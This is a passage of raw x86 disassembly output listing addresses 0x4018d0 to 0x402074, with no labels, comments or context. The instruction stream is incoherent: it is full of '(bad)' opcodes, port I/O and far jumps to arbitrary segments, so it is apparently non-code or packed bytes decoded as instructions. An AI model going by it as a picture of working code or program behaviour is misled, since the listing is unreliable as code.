  4018d0:	jmp    0x401861
  4018d2:	inc    ebx
  4018d3:	pop    ss
  4018d4:	add    edi,DWORD PTR [esi]
  4018d6:	cmp    DWORD PTR [edx-0x33e92a],esi
  4018dc:	add    al,0xf1
  4018de:	mov    al,ds:0xa5b7830
  4018e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018e5:	cmp    dl,BYTE PTR [edi-0x53018485]
  4018eb:	mov    ecx,0xa9a2196e
  4018f0:	(bad)  
  4018f2:	mov    ds:0xd681bb56,al
  4018f7:	in     eax,dx
  4018f8:	mov    ecx,esi
  4018fa:	pop    ebx
  4018fb:	jle    0x4018d1
  4018fd:	pop    edi
  4018fe:	dec    esp
  4018ff:	hlt    
  401900:	scas   eax,DWORD PTR es:[edi]
  401901:	push   0x13
  401903:	mov    edx,DWORD PTR [ecx+0x6a]
  401906:	lahf   
  401907:	push   0x2f
  401909:	and    BYTE PTR [edi+eiz*4],cl
  40190c:	pop    ebx
  40190d:	dec    esi
  40190e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190f:	cmp    dh,cl
  401911:	pushf  
  401912:	shl    ch,1
  401914:	jp     0x401928
  401916:	fist   WORD PTR [ebx+0x64]
  401919:	(bad)  
  40191a:	stos   BYTE PTR es:[edi],al
  40191b:	outs   dx,DWORD PTR ds:[esi]
  40191c:	lea    edx,[eax-0x2d1a8c68]
  401922:	xchg   esi,eax
  401923:	pop    ds
  401924:	dec    esp
  401925:	mov    al,ds:0x87740bfa
  40192a:	adc    BYTE PTR [esi-0x2e54f50d],ah
  401930:	pop    ecx
  401931:	mov    esi,0xbe290124
  401936:	and    esp,DWORD PTR [edi+0x699f240d]
  40193c:	shl    DWORD PTR [edx-0x6aa19e96],1
  401942:	xlat   BYTE PTR ds:[ebx]
  401943:	pop    ebx
  401944:	aaa    
  401945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401946:	test   BYTE PTR ds:0x27c5a633,cl
  40194c:	popa   
  40194d:	cmp    edx,DWORD PTR [ecx+0x4d1a70ee]
  401953:	xchg   ecx,eax
  401954:	and    al,0x5c
  401956:	mov    cl,0x17
  401958:	mov    eax,ds:0x6ea25d4d
  40195d:	xchg   BYTE PTR [ecx+0x428a6a73],dh
  401963:	push   ebp
  401964:	arpl   WORD PTR ss:[edx+ecx*4+0x7980821],dx
  40196c:	push   ebx
  40196d:	dec    ebx
  40196e:	std    
  40196f:	push   edx
  401970:	mov    ebx,0xfc302011
  401975:	out    dx,al
  401976:	daa    
  401977:	in     eax,dx
  401978:	inc    esp
  401979:	xor    BYTE PTR [ecx+0x7acaeb7b],ah
  40197f:	mov    eax,ds:0x75f662d9
  401984:	fidivr DWORD PTR [di]
  401987:	int    0xc0
  401989:	int3   
  40198a:	imul   ah
  40198c:	jnp    0x401928
  40198e:	mov    BYTE PTR ds:0x4116dd01,0xda
  401995:	adc    al,0xd1
  401997:	push   es
  401998:	jno    0x40191e
  40199a:	ja     0x401958
  40199c:	loop   0x401968
  40199e:	faddp  st(6),st
  4019a0:	hlt    
  4019a1:	mov    ebp,?
  4019a3:	stc    
  4019a4:	pop    es
  4019a5:	inc    ebx
  4019a6:	cmp    ebp,DWORD PTR [eax-0x79]
  4019a9:	into   
  4019aa:	ins    DWORD PTR es:[edi],dx
  4019ab:	mov    eax,ds:0xd21db6b1
  4019b0:	bound  esi,QWORD PTR [eax-0x61937353]
  4019b6:	lods   al,BYTE PTR ds:[esi]
  4019b7:	sub    bl,BYTE PTR [edi-0x9]
  4019ba:	das    
  4019bb:	cdq    
  4019bc:	sub    al,0xb4
  4019be:	test   BYTE PTR [esi+0x1d],cl
  4019c1:	sbb    eax,0x2acd8f66
  4019c6:	stos   BYTE PTR es:[edi],al
  4019c7:	nop
  4019c8:	inc    eax
  4019c9:	or     al,0x8e
  4019cb:	cmp    esp,esp
  4019cd:	aad    0x3e
  4019cf:	cwde   
  4019d0:	inc    ebp
  4019d1:	mov    dl,0x29
  4019d3:	cwde   
  4019d4:	add    BYTE PTR [bx+di-0x6bb],ch
  4019d9:	pop    edx
  4019da:	shr    DWORD PTR [ebp-0x200ea635],0xf
  4019e1:	sub    cl,BYTE PTR [edi+edi*8]
  4019e4:	ret    0x4cee
  4019e7:	(bad)  
  4019e8:	push   esp
  4019e9:	add    al,0x4a
  4019eb:	cli    
  4019ec:	sbb    BYTE PTR [edi-0x70d393c7],dl
  4019f2:	std    
  4019f3:	test   al,0x52
  4019f5:	xor    ch,BYTE PTR [esi]
  4019f7:	mov    ch,0x4b
  4019f9:	or     ecx,DWORD PTR [esi-0x7b]
  4019fc:	into   
  4019fd:	mov    eax,ds:0x90a694b
  401a02:	push   esi
  401a03:	add    DWORD PTR [edx],esp
  401a05:	out    dx,al
  401a06:	add    ch,BYTE PTR [edx+ebp*4+0x722f78bb]
  401a0d:	out    0xa9,al
  401a0f:	xchg   ebx,eax
  401a10:	mov    ch,BYTE PTR [ebx]
  401a12:	(bad)  
  401a14:	adc    al,BYTE PTR [ebx+0x6d]
  401a17:	(bad)  
  401a18:	out    dx,eax
  401a19:	gs scas al,BYTE PTR es:[edi]
  401a1b:	cmp    al,BYTE PTR [eax+0x71]
  401a1e:	xchg   edx,eax
  401a1f:	frstor [eax]
  401a21:	add    esi,edi
  401a23:	and    bh,BYTE PTR [ecx]
  401a25:	out    dx,al
  401a26:	sub    esi,DWORD PTR [esi]
  401a28:	daa    
  401a29:	aas    
  401a2a:	fimul  DWORD PTR [ecx-0x1c]
  401a2d:	(bad)  
  401a2e:	test   al,0x2e
  401a30:	es pop esp
  401a32:	dec    eax
  401a33:	push   DWORD PTR [eax-0x43]
  401a36:	scas   al,BYTE PTR es:[edi]
  401a37:	sahf   
  401a38:	cdq    
  401a39:	daa    
  401a3a:	inc    ebx
  401a3b:	mov    dh,0xeb
  401a3d:	das    
  401a3e:	scas   al,BYTE PTR es:[edi]
  401a3f:	adc    DWORD PTR [eax-0x69],0xce462275
  401a46:	rcl    ecx,1
  401a48:	(bad)  
  401a49:	or     eax,0xfbc1cd7f
  401a4e:	pop    ss
  401a4f:	pop    esp
  401a50:	xor    BYTE PTR [eax],al
  401a52:	mov    ch,0xf3
  401a54:	xor    esi,DWORD PTR [ebx-0x19928919]
  401a5a:	mov    ds:0xbfce92b5,al
  401a5f:	outs   dx,DWORD PTR ds:[esi]
  401a60:	aas    
  401a61:	jp     0x401a22
  401a63:	mov    dh,0x38
  401a65:	(bad)  
  401a66:	cmp    eax,0x69f3118d
  401a6b:	ss in  eax,dx
  401a6d:	(bad)  
  401a6f:	push   ss
  401a70:	daa    
  401a71:	inc    esp
  401a72:	mov    ds:0x17af4b48,al
  401a77:	rol    DWORD PTR [edi],0x25
  401a7a:	mov    ch,0x76
  401a7c:	cs mov edi,0x484756d
  401a82:	jp     0x401a8d
  401a84:	xchg   ebx,eax
  401a85:	ja     0x401a11
  401a87:	dec    ecx
  401a88:	sti    
  401a89:	mov    ds:0xf8ac7339,eax
  401a8e:	mov    eax,ds:0xfa51182d
  401a93:	into   
  401a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a95:	push   esi
  401a96:	std    
  401a97:	push   0xf1206f8e
  401a9c:	shr    DWORD PTR [ecx+0x688bbc33],cl
  401aa2:	cld    
  401aa3:	adc    dl,BYTE PTR [ecx+0x4d]
  401aa6:	repnz fldl2t 
  401aa9:	push   edx
  401aaa:	add    cl,BYTE PTR ds:0xb9dda6f7
  401ab0:	pop    ds
  401ab1:	adc    dh,BYTE PTR [ecx]
  401ab3:	mov    gs,WORD PTR [edx+edx*1+0xa]
  401ab7:	push   ebx
  401ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ab9:	add    bl,BYTE PTR [esi]
  401abb:	add    cl,bl
  401abd:	es push ecx
  401abf:	sub    BYTE PTR ds:0x416a73c5,al
  401ac5:	xor    dh,ah
  401ac7:	xor    DWORD PTR [edx],0x79a486ba
  401acd:	(bad)  
  401ace:	mov    al,ds:0xcb4a5db2
  401ad3:	push   edi
  401ad4:	or     BYTE PTR [ebx-0x39],bl
  401ad7:	cmp    eax,0x74208d8e
  401adc:	push   esi
  401add:	neg    esi
  401adf:	adc    al,0x7e
  401ae1:	data16 jnp 0x401b07
  401ae4:	in     al,0xd1
  401ae6:	mov    dl,0x60
  401ae8:	jo     0x401ac6
  401aea:	fstp   QWORD PTR [esi+0x63]
  401aed:	std    
  401aee:	adc    ch,BYTE PTR [ecx]
  401af0:	cmp    cl,al
  401af2:	inc    edx
  401af3:	cmp    DWORD PTR [edx+0x3f],esp
  401af6:	xchg   ebp,eax
  401af7:	jge    0x401b3e
  401af9:	jmp    0x401b62
  401afb:	fwait
  401afc:	ror    BYTE PTR [esi-0x32],cl
  401aff:	and    DWORD PTR [ecx+0x65e81ef0],edx
  401b05:	xor    esi,DWORD PTR [edx+0x2a]
  401b08:	sbb    eax,DWORD PTR [ebx]
  401b0a:	sahf   
  401b0b:	xchg   esp,eax
  401b0c:	lea    ebp,es:0x925aae55
  401b13:	mov    ebx,eax
  401b15:	(bad)  
  401b16:	bound  ebx,QWORD PTR [edi]
  401b18:	cmp    DWORD PTR [ebx+0x54],esi
  401b1b:	hlt    
  401b1c:	int    0xd6
  401b1e:	and    esi,DWORD PTR [ebp+0x53]
  401b21:	jb     0x401b9c
  401b23:	xor    esi,DWORD PTR [eax-0x7c]
  401b26:	or     ecx,DWORD PTR [ecx-0x1c]
  401b29:	call   0x10ab:0xf08cb7e7
  401b30:	push   edx
  401b31:	push   ds
  401b32:	mov    DWORD PTR [edi+esi*4],esp
  401b35:	out    0x87,al
  401b37:	xchg   edx,eax
  401b38:	and    BYTE PTR [eax],0xd2
  401b3b:	cmp    bl,dl
  401b3d:	fbld   TBYTE PTR [eax-0x42]
  401b40:	xchg   ecx,eax
  401b41:	es mov dl,0xcf
  401b44:	fild   WORD PTR [ecx+0x17]
  401b47:	int3   
  401b48:	jnp    0x401bbf
  401b4a:	retf   
  401b4b:	mov    bh,0x95
  401b4d:	inc    BYTE PTR [eax]
  401b4f:	xor    eax,0xc25cc447
  401b54:	push   eax
  401b55:	or     esi,DWORD PTR [ecx]
  401b57:	jns    0x401b86
  401b59:	mov    ecx,0x5fa72454
  401b5e:	xor    DWORD PTR [esi-0x1233f4eb],edi
  401b64:	mov    bh,0x38
  401b66:	add    eax,0xd3a5570f
  401b6b:	retf   
  401b6c:	rcr    DWORD PTR [eax],1
  401b6e:	and    bl,BYTE PTR [eax-0x46c7f0e6]
  401b74:	dec    ebx
  401b75:	retf   0xfea7
  401b78:	hlt    
  401b79:	(bad)  
  401b7a:	not    ah
  401b7c:	arpl   WORD PTR [edi-0x4],bp
  401b7f:	dec    edi
  401b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b81:	pop    ebp
  401b82:	jle    0x401bee
  401b84:	adc    BYTE PTR [esi],dl
  401b86:	xchg   DWORD PTR [eax-0x7e9d8b66],ebx
  401b8c:	pushf  
  401b8d:	fisubr DWORD PTR [ecx]
  401b8f:	fs aam 0x99
  401b92:	sub    al,0xf2
  401b94:	jo     0x401bd0
  401b96:	mov    ch,0xc2
  401b98:	(bad)  
  401b9a:	loope  0x401c0c
  401b9c:	push   0x32
  401b9e:	mov    ds:0x90848133,eax
  401ba3:	aaa    
  401ba4:	mov    dl,0x77
  401ba6:	gs pop ebp
  401ba8:	cmp    edi,ecx
  401baa:	and    dh,ch
  401bac:	(bad)  
  401bad:	loopne 0x401bfd
  401baf:	xor    DWORD PTR [edx],ebx
  401bb1:	dec    eax
  401bb2:	sahf   
  401bb3:	push   0xffffffb2
  401bb5:	ins    BYTE PTR es:[edi],dx
  401bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb7:	out    dx,al
  401bb8:	rol    DWORD PTR [edx+0x4],0xcb
  401bbc:	add    DWORD PTR [eax+0x7f],0x1932703c
  401bc3:	push   0xffffffc2
  401bc5:	mov    edx,0xc9933d6f
  401bca:	and    DWORD PTR [edi+edx*4+0x56807568],esi
  401bd1:	jmp    0x401c51
  401bd3:	in     eax,dx
  401bd4:	sub    ebx,DWORD PTR [esi+0xc]
  401bd7:	clc    
  401bd8:	jecxz  0x401be8
  401bda:	or     bl,0xfb
  401bdd:	xor    eax,0x2371309f
  401be2:	mov    edx,0x3583876c
  401be7:	pop    edi
  401be8:	pop    esp
  401be9:	mov    esi,0xf007de
  401bee:	jmp    0xb3d5:0xf3b6b131
  401bf5:	mov    ebp,0x40549416
  401bfa:	fwait
  401bfb:	pop    esi
  401bfc:	das    
  401bfd:	std    
  401bfe:	push   edi
  401bff:	stos   BYTE PTR es:[edi],al
  401c00:	data16 stc 
  401c02:	repnz mov cl,0xea
  401c05:	jae    0x401bba
  401c07:	retf   0x7314
  401c0a:	dec    eax
  401c0b:	lods   eax,DWORD PTR ds:[esi]
  401c0c:	xchg   esi,eax
  401c0d:	xchg   esp,eax
  401c0e:	inc    ebp
  401c0f:	and    DWORD PTR [edi],ebx
  401c11:	cmp    cl,dh
  401c13:	pop    esp
  401c14:	loope  0x401be4
  401c16:	pop    ebp
  401c17:	jmp    0x8575df76
  401c1c:	ss mov ebp,0xa89117aa
  401c22:	test   al,0x76
  401c24:	add    BYTE PTR [di],0xe2
  401c28:	xor    edx,DWORD PTR [ebx+0x46895b0d]
  401c2e:	and    cl,BYTE PTR [ecx]
  401c30:	enter  0x667d,0x60
  401c34:	cdq    
  401c35:	mov    ds:0x74157123,eax
  401c3a:	add    eax,0xf2cafc13
  401c3f:	jnp    0x401c44
  401c41:	pusha  
  401c42:	(bad)  
  401c43:	pop    es
  401c44:	xor    bl,BYTE PTR [eax+eax*8]
  401c47:	push   esi
  401c48:	mov    ah,0x4e
  401c4a:	fwait
  401c4b:	mov    eax,ds:0x89f5b16a
  401c50:	rcl    ch,cl
  401c52:	xor    eax,0x785420b5
  401c57:	mov    ch,0x98
  401c59:	out    dx,al
  401c5a:	mov    ecx,0x4db9da15
  401c5f:	xor    al,BYTE PTR [eax]
  401c61:	call   0xc0f19b4f
  401c66:	jns    0x401c39
  401c68:	or     bh,BYTE PTR [esi-0x7b12b1a]
  401c6e:	cli    
  401c6f:	ja     0x401cbf
  401c71:	div    DWORD PTR [ebx+0x1f]
  401c74:	stos   BYTE PTR es:[edi],al
  401c75:	sar    BYTE PTR [eax-0x52],1
  401c78:	and    dl,BYTE PTR [ebp+0x1c]
  401c7b:	mov    WORD PTR [ebx+0x11],?
  401c7e:	and    ah,cl
  401c80:	inc    eax
  401c81:	cmp    BYTE PTR [ebx-0x11],bh
  401c84:	jp     0x401c2e
  401c86:	(bad)  
  401c88:	ror    BYTE PTR [edi+0x4bace19b],0xca
  401c8f:	lods   eax,DWORD PTR ds:[esi]
  401c90:	ja     0x401c95
  401c92:	ss ret 
  401c94:	rcr    BYTE PTR [ecx-0x3],cl
  401c97:	xchg   esp,eax
  401c98:	cld    
  401c99:	jb     0x401ceb
  401c9b:	cwde   
  401c9c:	xlat   BYTE PTR ds:[ebx]
  401c9d:	sbb    bl,BYTE PTR [esi]
  401c9f:	mov    esi,0x8158854e
  401ca4:	bound  ebp,QWORD PTR [esi]
  401ca6:	inc    eax
  401ca7:	imul   esi,edx,0x3c
  401caa:	xor    DWORD PTR [ebx+eiz*4+0x6ee94abd],ecx
  401cb1:	add    ah,bh
  401cb3:	mov    esp,0x504704c8
  401cb8:	pop    edi
  401cb9:	push   ss
  401cba:	sub    dl,BYTE PTR [esi+0x1d]
  401cbd:	push   esi
  401cbe:	sti    
  401cbf:	(bad)  
  401cc0:	xor    eax,0xb9c54613
  401cc5:	cmp    edx,DWORD PTR [edi+0x38ff80f1]
  401ccb:	push   ds
  401ccc:	push   eax
  401ccd:	mov    cl,0x20
  401ccf:	addr16 dec esi
  401cd1:	pushf  
  401cd2:	and    eax,0xccbba4a2
  401cd7:	xchg   esi,eax
  401cd8:	aam    0xca
  401cda:	imul   edx,DWORD PTR [edi+0x16],0x6fc909d0
  401ce1:	mov    dh,0x39
  401ce3:	stos   BYTE PTR es:[edi],al
  401ce4:	std    
  401ce5:	cmp    esp,DWORD PTR [eax]
  401ce7:	(bad)  
  401ce8:	int    0x77
  401cea:	std    
  401ceb:	sbb    edi,ebx
  401ced:	adc    DWORD PTR [ebx+0x633f697e],ebp
  401cf3:	or     eax,edx
  401cf5:	xor    al,0x16
  401cf7:	adc    eax,0x9564a1b0
  401cfd:	mov    edi,0x3497e6d8
  401d02:	sub    BYTE PTR [ebp-0x34],dh
  401d05:	call   0xc564:0x4e44962e
  401d0c:	daa    
  401d0d:	pop    eax
  401d0e:	ss jl  0x401d30
  401d11:	lock xchg ebx,eax
  401d13:	pop    es
  401d14:	inc    ecx
  401d15:	add    esi,ecx
  401d17:	sbb    eax,0xfc57d730
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	fsub   DWORD PTR [edi]
  401d1f:	pop    esi
  401d20:	and    al,BYTE PTR [eax-0x49ee5f78]
  401d26:	in     eax,dx
  401d27:	mov    ecx,0xe32f4cdc
  401d2c:	and    al,0xfc
  401d2e:	jae    0x401d5a
  401d30:	inc    edx
  401d31:	hlt    
  401d32:	out    0xc9,eax
  401d34:	xchg   ecx,eax
  401d35:	adc    eax,0xf95e3731
  401d3a:	jae    0x401dac
  401d3c:	inc    esp
  401d3d:	stos   DWORD PTR es:[edi],eax
  401d3e:	add    DWORD PTR [ebx-0x7],esp
  401d41:	or     BYTE PTR [edx+0x7ab3a5a9],ah
  401d47:	test   BYTE PTR [ebx+0x25],0x10
  401d4b:	out    dx,al
  401d4c:	or     esi,DWORD PTR [ebx]
  401d4e:	jae    0x401cda
  401d50:	mov    ds:0x36373dae,eax
  401d55:	repnz push ebx
  401d57:	sahf   
  401d58:	dec    eax
  401d59:	bound  edx,QWORD PTR [esi-0x49]
  401d5c:	pop    edi
  401d5d:	fistp  WORD PTR [edx-0x5fd2f39b]
  401d63:	and    al,0xea
  401d65:	outs   dx,DWORD PTR ds:[esi]
  401d66:	sahf   
  401d67:	gs mov cl,0xaf
  401d6a:	adc    DWORD PTR [ebp+0x34f270a0],esp
  401d70:	neg    BYTE PTR ds:0x52b5ef19
  401d76:	pop    ss
  401d77:	fild   WORD PTR [edi]
  401d79:	cmp    BYTE PTR [ecx-0x208c20ea],bh
  401d7f:	jae    0x401d45
  401d81:	sar    DWORD PTR [esi-0x3e968fcb],0x5
  401d88:	pop    es
  401d89:	std    
  401d8a:	adc    DWORD PTR [ecx+edi*2+0x54773b0a],ebx
  401d91:	sbb    BYTE PTR [ecx-0x36],0xb7
  401d95:	xor    BYTE PTR [esp+edx*8+0x2c41f1d2],ah
  401d9c:	fwait
  401d9d:	xchg   ebp,eax
  401d9e:	lea    ebx,[eax-0x1f]
  401da1:	es test ebp,ebx
  401da4:	stos   DWORD PTR es:[edi],eax
  401da5:	fcomp  QWORD PTR [ebp+0x78dbe685]
  401dab:	mov    dl,0x26
  401dad:	call   0x8018:0x74bb5096
  401db4:	jno    0x401d9b
  401db6:	pop    ebp
  401db7:	pop    ebx
  401db8:	jmp    0x401d54
  401dba:	or     eax,0xb99b09a3
  401dbf:	adc    eax,0x5ad860fd
  401dc4:	mov    eax,ds:0xeb154975
  401dc9:	pop    esp
  401dca:	mov    ecx,0x5cdc0fe2
  401dcf:	push   cs
  401dd0:	jg     0x401dcb
  401dd2:	mov    WORD PTR [ebp-0x2d],?
  401dd5:	pop    edx
  401dd6:	dec    edx
  401dd7:	cwde   
  401dd8:	push   0xffffffaf
  401dda:	mov    bh,al
  401ddc:	(bad)  
  401ddd:	or     ebp,DWORD PTR [ecx-0x6a952726]
  401de3:	jo     0x401dc0
  401de5:	sub    eax,0x84ed2f99
  401dea:	cdq    
  401deb:	lock jle 0x401def
  401dee:	scas   al,BYTE PTR es:[edi]
  401def:	(bad)  [edi]
  401df1:	retf   
  401df2:	clc    
  401df3:	outs   dx,BYTE PTR ds:[esi]
  401df4:	xor    cl,bl
  401df6:	or     BYTE PTR [ebx-0x6],al
  401df9:	stc    
  401dfa:	outs   dx,BYTE PTR ds:[esi]
  401dfb:	call   0x89:0xc08f51d6
  401e02:	out    dx,al
  401e03:	pop    edx
  401e04:	and    eax,0xb5b17b1d
  401e09:	cli    
  401e0a:	imul   ebx,DWORD PTR [esi],0xb2c2d5f4
  401e10:	cmp    BYTE PTR [edi*1+0x1df777fe],dh
  401e17:	push   esp
  401e18:	(bad)  
  401e19:	mov    esp,0x846e0d7f
  401e1e:	cmp    ah,bh
  401e20:	pop    eax
  401e21:	inc    ebx
  401e22:	gs mov dh,0xa
  401e25:	fs xchg edx,eax
  401e27:	test   BYTE PTR [esi],cl
  401e29:	ins    BYTE PTR es:[edi],dx
  401e2a:	imul   ebp,DWORD PTR [edx],0xd1a01c25
  401e30:	mov    edx,DWORD PTR [edi+0x289607c7]
  401e36:	iret   
  401e37:	xchg   esi,eax
  401e38:	jb     0x401dc0
  401e3a:	mov    esp,0x99909e9b
  401e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e40:	bound  esi,QWORD PTR [eax+0x72]
  401e43:	and    BYTE PTR [ecx-0x7],al
  401e46:	pop    edx
  401e47:	xchg   edx,eax
  401e48:	(bad)  
  401e49:	cmp    DWORD PTR [ecx+0x51],ecx
  401e4c:	dec    edi
  401e4d:	sar    DWORD PTR gs:[ebp-0x2e],0xdc
  401e52:	or     al,0xde
  401e54:	jge    0x401e9a
  401e56:	sbb    eax,esp
  401e58:	xor    ebx,0x84298bfa
  401e5e:	jno    0x401eb0
  401e60:	push   ds
  401e61:	dec    ebx
  401e62:	loopne 0x401e1c
  401e64:	mov    edx,0xfcfe833b
  401e69:	(bad)  
  401e6a:	fadd   DWORD PTR [ecx-0x72]
  401e6d:	ss out 0xe5,eax
  401e70:	cmc    
  401e71:	mov    al,ds:0x1621303
  401e76:	pop    es
  401e77:	xchg   ecx,ecx
  401e79:	out    0xf,al
  401e7b:	xchg   esi,eax
  401e7c:	xlat   BYTE PTR ds:[ebx]
  401e7d:	jns    0x401e3c
  401e7f:	outs   dx,BYTE PTR es:[esi]
  401e81:	les    ecx,FWORD PTR [eax+0x26]
  401e84:	dec    esi
  401e85:	jle    0x401e8c
  401e87:	inc    ebp
  401e88:	or     eax,0xe42740fa
  401e8d:	leave  
  401e8e:	into   
  401e8f:	inc    ecx
  401e90:	cdq    
  401e91:	gs inc esi
  401e93:	out    0x5c,eax
  401e95:	in     eax,0xd9
  401e97:	test   al,0x81
  401e99:	dec    ecx
  401e9a:	push   0x8d20c097
  401e9f:	and    eax,DWORD PTR [ebx+esi*2]
  401ea2:	push   esi
  401ea3:	sahf   
  401ea4:	jg     0x401eae
  401ea6:	add    dl,bl
  401ea8:	rcl    edi,0x1b
  401eab:	sub    eax,0x75f49070
  401eb0:	clc    
  401eb1:	ret    0xe6aa
  401eb4:	cmp    dh,BYTE PTR [edx]
  401eb6:	add    esi,DWORD PTR [esi+0x10]
  401eb9:	fs (bad) 
  401ebb:	retf   0xc338
  401ebe:	aas    
  401ebf:	std    
  401ec0:	mov    ah,0x9d
  401ec2:	jl     0x401ef2
  401ec4:	push   ecx
  401ec5:	das    
  401ec6:	retf   
  401ec7:	jmp    0x401f17
  401ec9:	sub    al,0x88
  401ecb:	scas   al,BYTE PTR es:[edi]
  401ecc:	jecxz  0x401e8b
  401ece:	mov    ds:0xb109b373,eax
  401ed3:	xchg   edx,eax
  401ed4:	pushf  
  401ed5:	push   ecx
  401ed6:	inc    edx
  401ed7:	(bad)  
  401ed8:	push   ds
  401ed9:	shr    DWORD PTR [ecx+ebx*1+0x2529b910],cl
  401ee0:	es loope 0x401ea9
  401ee3:	lock shl ebp,1
  401ee6:	ds je  0x401ecb
  401ee9:	sub    BYTE PTR [esi],al
  401eeb:	out    0x67,eax
  401eed:	outs   dx,BYTE PTR ds:[esi]
  401eee:	dec    edx
  401eef:	cwde   
  401ef0:	sbb    eax,0xf3365830
  401ef5:	mov    edx,0xb7bed531
  401efa:	xor    dl,ch
  401efc:	setbe  bh
  401eff:	jg     0x401f56
  401f01:	imul   esp,DWORD PTR [edx],0x16
  401f04:	add    DWORD PTR [edi-0x77b24e8a],0x60d25ea1
  401f0e:	mov    al,ds:0xcd77f3e2
  401f13:	mov    al,0x6c
  401f15:	or     DWORD PTR [ebx-0x637e9a49],esp
  401f1b:	(bad)  
  401f1c:	push   cs
  401f1d:	and    eax,0xea54049f
  401f22:	xchg   ebp,eax
  401f23:	sbb    DWORD PTR [ecx-0x77],edx
  401f26:	cmp    DWORD PTR [edx-0x56f4c54d],ebp
  401f2c:	xchg   ecx,eax
  401f2d:	ror    DWORD PTR [ebx],cl
  401f2f:	cmp    dh,BYTE PTR [edx+0x138ead77]
  401f35:	pop    ecx
  401f36:	xor    ch,ah
  401f38:	stos   BYTE PTR es:[edi],al
  401f39:	xchg   DWORD PTR [edi+0x119655b8],ebp
  401f3f:	mov    bl,0xa9
  401f41:	fsub   st(0),st
  401f43:	mov    al,0x37
  401f45:	outs   dx,BYTE PTR ds:[esi]
  401f46:	jmp    0x5b2f982f
  401f4b:	xor    bl,BYTE PTR [esi-0x15]
  401f4e:	adc    eax,0x77e400df
  401f53:	ja     0x401f48
  401f55:	fdiv   DWORD PTR [esi]
  401f57:	or     al,0x88
  401f59:	in     eax,0xbe
  401f5b:	ret    0xc03a
  401f5e:	pop    edx
  401f5f:	inc    ebp
  401f60:	stos   BYTE PTR es:[edi],al
  401f61:	adc    edx,0x33
  401f64:	mov    dh,0xe
  401f66:	xor    DWORD PTR [edi+ecx*1-0x395ddb7e],ebx
  401f6d:	sub    ah,BYTE PTR [ecx+edi*1]
  401f70:	call   0x135be891
  401f75:	scas   eax,DWORD PTR es:[edi]
  401f76:	pop    ecx
  401f77:	mov    ah,0x8b
  401f79:	inc    esi
  401f7a:	fs cs int 0xf7
  401f7e:	sti    
  401f7f:	fcom   QWORD PTR [ebx]
  401f81:	loop   0x401fbd
  401f83:	shl    BYTE PTR [edx],cl
  401f85:	cmp    eax,DWORD PTR [eax]
  401f87:	cld    
  401f88:	and    al,BYTE PTR [ebp+0x14]
  401f8b:	test   ebx,esi
  401f8d:	pop    esi
  401f8e:	nop
  401f8f:	rol    DWORD PTR [ecx+eiz*8+0x2d],cl
  401f93:	sub    ch,BYTE PTR [edi-0x319a4829]
  401f99:	iret   
  401f9a:	xchg   DWORD PTR [ecx*1-0x27915e49],ebp
  401fa1:	pop    ds
  401fa2:	and    ah,dh
  401fa4:	fs xchg esp,eax
  401fa6:	inc    ebp
  401fa7:	loop   0x401f5b
  401fa9:	sub    eax,0x2cb3198f
  401fae:	rcr    DWORD PTR [ebp+0x40],cl
  401fb1:	sbb    DWORD PTR [edx],edx
  401fb3:	push   0xffffffc2
  401fb5:	sbb    DWORD PTR [esi+0x34],edi
  401fb8:	out    0x57,al
  401fba:	xchg   esi,eax
  401fbb:	out    0x45,eax
  401fbd:	dec    eax
  401fbe:	int    0x2b
  401fc0:	js     0x401f9d
  401fc2:	jne    0x401fa5
  401fc4:	push   esp
  401fc5:	frstor [edi+0x4f]
  401fc8:	out    dx,al
  401fc9:	and    eax,0x8cee8d4c
  401fce:	jno    0x402032
  401fd0:	mov    edi,0xdd96270b
  401fd5:	pop    ebx
  401fd6:	leave  
  401fd7:	jmp    0x346c9acc
  401fdc:	or     eax,0xa672427a
  401fe1:	add    DWORD PTR fs:[edi-0x66974a06],esp
  401fe8:	dec    esi
  401fe9:	mov    esp,0x54bbc74f
  401fee:	stos   DWORD PTR es:[edi],eax
  401fef:	jmp    eax
  401ff1:	push   0xc047e5d7
  401ff6:	adc    al,cl
  401ff8:	push   eax
  401ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ffa:	push   ebx
  401ffb:	ficomp DWORD PTR [esi+0x49]
  401ffe:	push   ss
  401fff:	pop    eax
  402000:	mov    ds:0xdf98358c,al
  402005:	add    eax,0x8e4448df
  40200a:	lods   eax,DWORD PTR ds:[esi]
  40200b:	into   
  40200c:	inc    edx
  40200d:	cmp    eax,DWORD PTR [eax-0x1]
  402010:	lea    esi,[esi+ecx*2]
  402013:	and    BYTE PTR [eax-0x33e250d5],cl
  402019:	inc    edi
  40201a:	sub    al,0xe5
  40201c:	bound  eax,QWORD PTR [ebx+0x6c6dda5a]
  402022:	sub    ah,BYTE PTR [esi+edx*4]
  402025:	icebp  
  402026:	push   ebx
  402027:	imul   esp,DWORD PTR [eax+eax*1-0x1a],0xffffffb1
  40202c:	cmp    al,0xfb
  40202e:	outs   dx,DWORD PTR ds:[esi]
  40202f:	xchg   esp,eax
  402030:	and    DWORD PTR [esi],esi
  402032:	outs   dx,DWORD PTR ds:[esi]
  402033:	retf   
  402034:	or     dl,BYTE PTR [eax+0x68a12710]
  40203a:	enter  0x5fda,0x4e
  40203e:	xor    BYTE PTR [eax-0x5196fddf],al
  402044:	cld    
  402045:	scas   al,BYTE PTR es:[edi]
  402046:	cmp    dl,ch
  402048:	sbb    eax,0xe3a16b18
  40204d:	push   esp
  40204e:	aaa    
  40204f:	into   
  402050:	loopne 0x402052
  402052:	jecxz  0x402043
  402054:	dec    ecx
  402055:	add    edi,DWORD PTR [eax+0x45284678]
  40205b:	inc    edx
  40205c:	and    al,0x8d
  40205e:	dec    edx
  40205f:	aaa    
  402060:	sub    BYTE PTR [eax+ecx*2+0x7f],al
  402064:	ss call 0x596c584d
  40206a:	or     ah,BYTE PTR [ecx-0xad55fe0]
  402070:	adc    DWORD PTR [esi],ebp
  402072:	add    DWORD PTR [esi],ecx
  402074:	sbb    dh,BYTE PTR ds:0xec6d0fcd
